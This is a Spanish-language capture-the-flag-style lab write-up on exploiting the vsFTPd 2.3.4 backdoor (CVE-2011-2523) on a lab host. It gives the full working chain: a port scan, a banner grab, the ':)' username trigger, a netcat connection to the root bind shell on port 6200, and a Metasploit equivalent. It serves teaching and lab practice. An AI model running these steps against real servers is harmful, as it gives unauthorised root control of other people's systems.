# 🐙 Writeup — Explotación del backdoor de vsFTPd 2.3.4

![Platform](https://img.shields.io/badge/Lab-Entorno_controlado-blue)
![CVE](https://img.shields.io/badge/CVE-2011--2523-red)
![Severity](https://img.shields.io/badge/CVSS-10.0_Crítica-critical)
![Status](https://img.shields.io/badge/Estado-Completado-success)
![Access](https://img.shields.io/badge/Acceso-root_(uid%3D0)-black)

---

## 📑 Tabla de contenidos

- [Información del objetivo](#-información-del-objetivo)
- [Resumen](#1-resumen)
- [Herramientas utilizadas](#2-herramientas-utilizadas)
- [Fase 1 — Reconocimiento](#3-fase-1--reconocimiento)
- [Fase 2 — Identificación del servicio](#4-fase-2--identificación-del-servicio)
- [Fase 3 — Explotación](#5-fase-3--explotación-disparo-del-backdoor)
- [Fase 4 — Acceso como root](#6-fase-4--acceso-como-root)
- [Conclusión](#7-conclusión)
- [Anexo — Metasploit](#anexo--vía-automatizada-metasploit)

---

## 🎯 Información del objetivo

| Campo | Valor |
|-------|-------|
| **Laboratorio** | Explotación del backdoor de vsFTPd 2.3.4 para obtener acceso como root |
| **Objetivo (IP)** | `172.17.0.2` |
| **Vulnerabilidad** | vsFTPd 2.3.4 — backdoor malicioso (CVE-2011-2523) |
| **Severidad** | Crítica (CVSS 10.0) — RCE sin autenticación como root |
| **Fecha** | 2026-10-25 |
| **Resultado** | ✅ Objetivo cumplido — shell como `root` (uid=0) |

---

## 1. Resumen 

La máquina objetivo expone un servicio FTP ejecutando **vsFTPd 2.3.4**, una versión cuyo código fuente fue comprometido en origen (julio de 2011) con la inserción de una **puerta trasera**. La vulnerabilidad se activa enviando como nombre de usuario una cadena terminada en la secuencia `:)`; al hacerlo, el servicio abre de forma oculta un **bind shell en el puerto 6200/tcp** con privilegios de **root**.

Se consiguió explotar la vulnerabilidad, obteniendo una shell interactiva como `root` sin necesidad de credenciales válidas.

---

## 2. Herramientas utilizadas

- `nmap` — escaneo de puertos y detección de servicios.
- `netcat (nc)` — interacción con el protocolo FTP y conexión al bind shell.
- *(Opcional)* Metasploit Framework — módulo `exploit/unix/ftp/vsftpd_234_backdoor`.

---

## 3. Fase 1 — Reconocimiento

Escaneo completo de puertos sobre el objetivo:

```bash
nmap -p- 172.17.0.2
```

<details>
<summary>📄 Ver salida completa</summary>

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 18:24 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: F6:F4:41:AE:53:6E (Unknown)
```

</details>

> [!TIP]
> **Hallazgo:** único puerto abierto → **21/tcp (FTP)**.

---

## 4. Fase 2 — Identificación del servicio

Conexión directa al puerto 21 para leer el banner del servicio:

```bash
nc 172.17.0.2 21
```

**Salida:**

```
220 (vsFTPd 2.3.4)
```

> [!IMPORTANT]
> **Hallazgo:** el banner confirma **vsFTPd 2.3.4**, versión afectada por el backdoor (CVE-2011-2523).

---

## 5. Fase 3 — Explotación (disparo del backdoor)

### 5.1 Activación

En la misma sesión FTP, se envía un usuario terminado en `:)` y una contraseña cualquiera:

```
USER user:)
331 Please specify the password.
PASS user:)
```

La conexión queda en espera: comportamiento esperado, el backdoor se está activando.

### 5.2 Verificación del disparo

Se repite el escaneo para confirmar que el backdoor abrió un nuevo puerto:

```bash
nmap -p- 172.17.0.2
```

<details>
<summary>📄 Ver salida completa</summary>

```
PORT     STATE SERVICE
21/tcp   open  ftp
6200/tcp open  lm-x
```

</details>

> [!TIP]
> **Hallazgo:** aparece el puerto **6200/tcp**, que no existía en el primer escaneo → **backdoor activado con éxito**.

---

## 6. Fase 4 — Acceso como root

Conexión al bind shell abierto en el puerto 6200:

```bash
nc 172.17.0.2 6200
```

Comprobación de identidad y privilegios:

```
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

> [!WARNING]
> **Resultado:** se obtiene una shell interactiva con **privilegios de root (uid=0)**. Compromiso total del sistema. 🎯

El directorio de trabajo de la shell corresponde al árbol de código fuente de vsftpd (`main.c`, `vsftpd.conf`, etc.), ya que el proceso se ejecuta desde su directorio de compilación.

---

## 7. Conclusión

Se ha reproducido con éxito la cadena completa de explotación del backdoor de vsFTPd 2.3.4 de forma manual: reconocimiento → identificación de versión → disparo del backdoor → verificación → acceso como root. El ejercicio demuestra el riesgo de los ataques a la **cadena de suministro de software** y la importancia de verificar la integridad del código fuente.

> [!NOTE]
> **Estado del ejercicio: COMPLETADO ✅**

---

## Anexo — Vía automatizada (Metasploit)

Como comparación, el mismo ataque puede ejecutarse con el módulo dedicado:

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
run
```

El módulo automatiza exactamente los mismos pasos realizados a mano: disparo del backdoor en el 21 y recogida de la shell root a través del 6200.

---

<sub>📝 Writeup con fines educativos · Entorno de laboratorio autorizado · 2026</sub>
